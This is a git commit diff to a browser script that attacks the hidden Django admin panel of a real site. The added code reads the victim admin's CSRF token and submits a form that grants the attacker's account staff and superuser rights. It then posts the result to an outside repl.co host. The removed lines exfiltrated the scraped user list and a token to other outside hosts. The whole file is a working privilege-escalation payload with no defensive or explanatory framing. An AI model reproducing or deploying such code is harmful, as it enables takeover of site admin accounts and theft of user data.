5844b45919e7071b1adda3b2de9712ffb7c8be74
joonshakyawebsites <58363402+joonshakyawebsites@users.noreply.github.com>
2022-01-22 18:29:01 +0545

    Add files via upload

--- script.js
+++ script.js
@@ -1,29 +1,58 @@
 redirected = false;
 (async () => {
   res = await fetch(
-    "https://gyane.xyz/gyane_private_admin_no_body_should_know_it/auth/user/20/change/"
+    "https://gyane.xyz/gyane_private_admin_no_body_should_know_it/auth/user/"
   );
   redirected = res.redirected;
   data = await res.text();
   if (!redirected && res.status != 403) {
-    fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co", {
+    formData = new FormData();
+    formData.append(
+      "csrfmiddlewaretoken",
+      document.getElementsByName("csrfmiddlewaretoken")[0].value
+    );
+    formData.append("username", "joonshakya");
+    formData.append("first_name", "Joon");
+    formData.append("last_name", "Shakya");
+    formData.append("email", "joonshakya07@gmail.com");
+    formData.append("is_active", "on");
+    formData.append("is_staff", "on");
+    formData.append("is_superuser", "on");
+    formData.append("last_login_0", "2022-01-22");
+    formData.append("last_login_1", "11:01:32");
+    formData.append("date_joined_0", "2022-01-20");
+    formData.append("date_joined_1", "14:39:02");
+    formData.append("initial-date_joined_0", "2022-01-20");
+    formData.append("initial-date_joined_1", "14:39:02");
+    formData.append("_save", "Save");
+    res3 = await fetch(
+      "https://gyane.xyz/gyane_private_admin_no_body_should_know_it/auth/user/20/change/",
+      { method: "POST", body: formData }
+    );
+    fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
       method: "POST",
-      body: JSON.stringify({ data }),
+      body: { done: "Done" },
       headers: {
         "Content-Type": "application/json",
       },
     });
-    fetch("https://mattrab.joonshakya.com.np/", {
-      method: "POST",
-      body: JSON.stringify({
-        to: 45,
-        message: "Got the user list",
-        n_id: 1000000,
-        token: "c29tZW9uZSBnYXZlIGFjY2VzcyBtYXliZTQ1MTAwMDAwMA==",
-      }),
-      headers: {
-        "Content-Type": "application/json",
-      },
-    });
+    if (res3.ok) {
+      data3 = await res3.text();
+      fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
+        method: "POST",
+        body: JSON.stringify({ data3 }),
+        headers: {
+          "Content-Type": "application/json",
+        },
+      });
+    } else {
+      fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co?id=", {
+        method: "POST",
+        body: JSON.stringify({ error: res3.status }),
+        headers: {
+          "Content-Type": "application/json",
+        },
+      });
+    }
   }
 })();
